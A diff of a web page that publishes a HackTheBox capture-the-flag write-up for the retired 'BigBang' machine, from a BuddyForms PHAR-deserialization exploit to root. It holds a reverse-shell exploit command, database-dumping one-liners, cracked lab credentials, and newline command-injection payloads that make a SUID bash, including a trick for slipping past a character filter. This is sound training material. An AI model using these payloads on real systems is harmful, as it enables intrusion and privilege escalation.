@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>BigBang - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/BigBang.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for BigBang machine from HackTheBox - Hard difficulty level">
+    <meta name="description" content="Detailed writeup for BigBang machine from HackTheBox - Hard difficulty level">
     <meta name="keywords" content="HackTheBox, BigBang, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,163 @@
         <h1 class="writeup-title">BigBang</h1>
         <div class="writeup-metadata">
             <span class="difficulty hard">Hard</span>
-            <span class="date">Active machine</span>
+            <span class="date">May 3, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="BigBang" src="../images/BigBang/pwned.png" /></p>
-<p>BigBang is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once BigBang retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/BigBang/pwned.png" /></p>
+<p>BigBang was a hard Linux-based challenge that combined web application vulnerabilities with container security and API exploitation to create a multi-stage privilege escalation path.
+Initial reconnaissance revealed a WordPress blog with a vulnerable BuddyForms plugin (version 2.7.7). By exploiting CVE-2024-2961, a PHAR deserialization vulnerability, I gained remote code execution on the web server.
+This initial foothold provided access as the www-data user.</p>
+<p>After examining the WordPress configuration files, I discovered database credentials that allowed me to extract and crack user hashes from the WordPress database running in a Docker container.
+The credentials for user "shawking" (password: quantumphysics) granted SSH access to the target system.</p>
+<p>Further enumeration from shawking's account revealed a Grafana instance running on port 3000.
+By examining the Grafana database stored in /opt/data, I extracted and cracked the "developer" user's password (bigbang), which provided additional SSH access.</p>
+<p>In the developer's home directory, I discovered an Android APK file that, when decompiled, revealed an app running on port 9090.
+Analysis of the application code showed that the /command endpoint was vulnerable to command injection through improper handling of newline characters in the "output file" JSON field .</p>
+<p>By crafting specific payloads that bypassed character filtering, I exploited this vulnerability to create a SUID binary, which provided root access and completed the challenge.
+The box demonstrated the importance of proper input validation, the risks of having lax permissions on sensitive files, and how seemingly minor vulnerabilities can be used to achieve privilege escalation.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/BigBang/nmap.png" /></p>
+<p>Nmap scan reveals only 2 ports. SSH and HTTP.</p>
+<h2>Footprinting the web stack</h2>
+<p><img alt="site" src="../images/BigBang/site.png" /></p>
+<p>Its a website of a physics university/blog. I'll take a look around the main page.</p>
+<p><img alt="buddyforms" src="../images/BigBang/buddyforms.png" /></p>
+<p>Right below the form, I can see a mention of buddyforms. A form builder compatibile with wordpress.</p>
+<p><img alt="wordpress" src="../images/BigBang/wordpress.png" /></p>
+<p>Which is also mentioned at the bottom of the page.</p>
+<p>I will check out the website's source code as well.</p>
+<p><img alt="1" src="../images/BigBang/1.png" /></p>
+<p>I used the search functionality to search for the "wordpress" string in the source code, and almost immediately found the WP version.</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">&lt;script</span><span class="w"> </span><span class="na">src=</span><span class="s">&quot;http://blog.bigbang.htb/wp-content/plugins/buddyforms/assets/resources/featured-image/featured-image-initializer.js?ver=2.7.7&quot;</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;buddyforms_featured_image_initializer-js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div>
+
+<p>And the buddyforms version as well.</p>
+<h2>Gaining RCE on the box via buddyforms CVE</h2>
+<p>I found out that buddyforms 2.7.7 has a PHAR deserialization CVE, but not only that.</p>
+<p><code>https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/buddyforms/buddyforms-277-phar-deserialization</code></p>
+<p>Back when the box was released, this part definitely took me the longest to figure out.</p>
+<p><code>https://github.com/ambionics/cnext-exploits?tab=readme-ov-file</code></p>
+<p>The cnext exploit had to be modified in a few ways, but with some help, I managed to do it.</p>
+<p>Sadly, I cannot show my script as I've lost it after my 1st kali VM broke. (Always make backups!)</p>
+<p>Now however, there are many PoCs floating around github. It will be much simpler to get code execution.</p>
+<p><code>https://github.com/suce0155/CVE-2024-2961_buddyforms_2.7.7</code></p>
+<p>Run the python script:</p>
+<p><code>python buddyforms_2.7.7_cnext_exploit.py  http://blog.bigbang.htb/wp-admin/admin-ajax.php 10.10.16.18 9001</code></p>
+<p><img alt="shell" src="../images/BigBang/shell.png" /></p>
+<h2>Dumping the wordpress database</h2>
+<p>I couldn't find the database while browsing directories. I'll read the wp-config.php file, as that is where the details should be.</p>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="nx">snippet</span>
+
+<span class="c1">// ** Database settings - You can get this info from your web host ** //</span>
+<span class="cm">/** The name of the database for WordPress */</span>
+<span class="nx">define</span><span class="p">(</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">DB_NAME</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">wordpress</span><span class="err">&#39;</span><span class="w"> </span><span class="p">);</span>
+
+<span class="cm">/** Database username */</span>
+<span class="nx">define</span><span class="p">(</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">DB_USER</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">wp_user</span><span class="err">&#39;</span><span class="w"> </span><span class="p">);</span>
+
+<span class="cm">/** Database password */</span>
+<span class="nx">define</span><span class="p">(</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">DB_PASSWORD</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">wp_password</span><span class="err">&#39;</span><span class="w"> </span><span class="p">);</span>
+
+<span class="cm">/** Database hostname */</span>
+<span class="nx">define</span><span class="p">(</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">DB_HOST</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="m m-Double">172.17.0.1</span><span class="err">&#39;</span><span class="w"> </span><span class="p">);</span>
+
+<span class="cm">/** Database charset to use in creating database tables. */</span>
+<span class="nx">define</span><span class="p">(</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">DB_CHARSET</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">utf8mb4</span><span class="err">&#39;</span><span class="w"> </span><span class="p">);</span>
+
+<span class="cm">/** The database collate type. Don&#39;t change this if in doubt. */</span>
+<span class="nx">define</span><span class="p">(</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">DB_COLLATE</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="w"> </span><span class="p">);</span>
+</code></pre></div>
+
+<p>It looks like the database is hidden in a docker container of some sorts. Mysql is not available to my user, so I'll have to get by somehow.</p>
+<p>I'll take the credentials from the .php file, and I will try to send a raw query to the container with php.</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">php</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="s1">&#39;</span>
+<span class="s1">$mysqli = new mysqli(&quot;172.17.0.1&quot;, &quot;wp_user&quot;, &quot;wp_password&quot;, &quot;wordpress&quot;);</span>
+<span class="s1">if($mysqli-&gt;connect_error) { die(&quot;Connect Error: &quot; . $mysqli-&gt;connect_error); }</span>
+<span class="s1">$result = $mysqli-&gt;query(&quot;SHOW TABLES&quot;);</span>
+<span class="s1">while ($row = $result-&gt;fetch_array()) { echo $row</span><span class="cp">[</span><span class="mi">0</span><span class="cp">]</span><span class="s1"> . &quot;\n&quot;; }</span>
+<span class="s1">&#39;</span>
+</code></pre></div>
+
+<p><img alt="raw1" src="../images/BigBang/raw1.png" /></p>
+<p>That worked! In the same way, I can exfiltrate users and credentials. I'll adjust the query a little bit.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">php</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="s">&#39;</span>
+<span class="s">$mysqli = new mysqli(&quot;</span><span class="mf">172.17.0.1</span><span class="s">&quot;, &quot;</span><span class="n">wp_user</span><span class="s">&quot;, &quot;</span><span class="n">wp_password</span><span class="s">&quot;, &quot;</span><span class="n">wordpress</span><span class="s">&quot;);</span>
+<span class="s">$res = $mysqli-&gt;query(&quot;</span><span class="n">SELECT</span><span class="w"> </span><span class="n">user_login</span><span class="p">,</span><span class="w"> </span><span class="n">user_pass</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="n">wp_users</span><span class="s">&quot;);</span>
+<span class="s">while ($row = $res-&gt;fetch_assoc()) { echo $row[&quot;</span><span class="n">user_login</span><span class="s">&quot;] . &quot;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot; . $row[&quot;</span><span class="n">user_pass</span><span class="s">&quot;] . &quot;</span><span class="err">\</span><span class="n">n</span><span class="s">&quot;; }</span>
+<span class="s">&#39;</span>
+</code></pre></div>
+
+<p><img alt="raw2" src="../images/BigBang/raw2.png" /></p>
+<p>There are two hashes. I'll copy them over to my box so that I can crack them with hashcat.</p>
+<p><img alt="crack1" src="../images/BigBang/crack1.png" /></p>
+<p><code>shawking:quantumphysics</code></p>
+<p>I'll try to SSH into the box with these credentials.</p>
+<p><img alt="user" src="../images/BigBang/user.png" /></p>
+<h1>Root flag</h1>
+<p>Shawking cannot do much on the box. No sudo commands, no groups. Nothing interesting in his home folder either.</p>
+<p><img alt="ports" src="../images/BigBang/ports.png" /></p>
+<p>I noticed two intersting active ports. 3000 and 9090. I'll forward them both to my machine.</p>
+<h2>Dumping the grafana database</h2>
+<p>The service on port 9090 returned a Not Found error. running a curl with --head shows that its a python app/server.</p>
+<p><img alt="grafana" src="../images/BigBang/grafana.png" /></p>
+<p>Grafana is running on port 3000. It is an open-source analytics and interactive visualization web application used for monitoring application performance.</p>
+<p>Shawking's credentials don't work with grafana. I'll search the box for a different set.</p>
+<p>Soon after that, I found the grafana database in /opt/data.</p>
+<p><img alt="db" src="../images/BigBang/db.png" /></p>
+<p>I'll transfer it onto my box with scp.</p>
+<p><code>scp shawking@10.10.11.52:/opt/data/grafana.db .</code></p>
+<p><img alt="hashes" src="../images/BigBang/hashes.png" /></p>
+<p>There are two users in the database, alongside their hashes.</p>
+<p>The hashes won't be cracked in this format. grafana stores its hash digests in hexadecimal, and the salts in plaintext.</p>
+<p>I'll use grafana2hashcat in order to convert the developer hash into a crackable format.</p>
+<p><code>https://github.com/iamaldi/grafana2hashcat</code></p>
+<p>I'll copy the hash into a separate file, in a hash,salt format.</p>
+<div class="codehilite"><pre><span></span><code><span class="mf">7</span><span class="n">e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960</span><span class="p">,</span><span class="mf">4</span><span class="n">umebBJucv</span>
+</code></pre></div>
+
+<p>Now I will run the script to convert it.</p>
+<p><img alt="convert" src="../images/BigBang/convert.png" /></p>
+<p>And now to crack it with hashcat.</p>
+<p><img alt="cracked" src="../images/BigBang/cracked.png" /></p>
+<p><code>developer:bigbang</code></p>
+<h2>Investigating the .apk file</h2>
+<p><img alt="apk" src="../images/BigBang/apk.png" /></p>
+<p>In developer's home folder, there is an .apk file. I'll copy it over the same way as before.</p>
+<p>I will use apktool to "unpack" the apk file.</p>
+<p><img alt="apktool" src="../images/BigBang/apktool.png" /></p>
+<p>Then, I'll use a recursive grep to search for strings inside the unpacked folder.</p>
+<p><img alt="grep1" src="../images/BigBang/grep1.png" /></p>
+<p>Found a login endpoint. I'll use 'http://app.bigbang.htb:9090' as a string for my next grep search, in hopes of uncovering more endpoints.</p>
+<p><img alt="grep2" src="../images/BigBang/grep2.png" /></p>
+<p>There is also a /command endpoint.</p>
+<p><img alt="grep3" src="../images/BigBang/grep3.png" /></p>
+<p>And I even got some extra information about that endpoint.</p>
+<h2>Abusing the vulnerable endpoint</h2>
+<p>I used curl to interact with the login endpoint from the developer ssh session.</p>
+<p><img alt="login" src="../images/BigBang/login.png" /></p>
+<p>And I got an access token. I'll append it to my curl command, and I will attempt to interact with the /command endpoint.</p>
+<p>After a while, I found a way to get code execution via the command endpoint.</p>
+<p><img alt="vuln" src="../images/BigBang/vuln.png" /></p>
+<p>The output file parameter does not sanitize user's data input. By placing a \n newline character, everything after it will be "pushed" into a new line and treated as a command.</p>
+<p>To exploit this, I can create a SETUID copy of bash in /tmp. If this works, It will have root privileges.</p>
+<p>However, it seems like my attempt was stopped by a filter of some sort.</p>
+<p><code>"test.png\n cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash"}</code></p>
+<p><img alt="dangerous" src="../images/BigBang/dangerous.png" /></p>
+<p>The filter treats "+" as a dangerous character. I deduced this simply by eliminating each piece of the command one at a time, until the error was gone.</p>
+<p>I changed the command a little, this time using a numerical representation of the SETUID bit.</p>
+<p><code>"test.png\n cp /bin/bash /tmp/rootbash &amp;&amp; chmod 4755 /tmp/rootbash"}</code></p>
+<p>Still, it kept getting flagged by the filter. Another deduction showed that the filter was also flagging the "&amp;" characters.</p>
+<p>Its no problem at all though. I can just remove the "&amp;" characters entirely and split the payload into two curl commands.</p>
+<p><code>"test.png\n cp /bin/bash /tmp/rootbash"}'</code></p>
+<p>First one to create the rootbash.</p>
+<p><code>"test.png\n chmod 4755 /tmp/rootbash"}</code></p>
+<p>And the second one to give it the SETUID bit.</p>
+<p><img alt="root" src="../images/BigBang/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
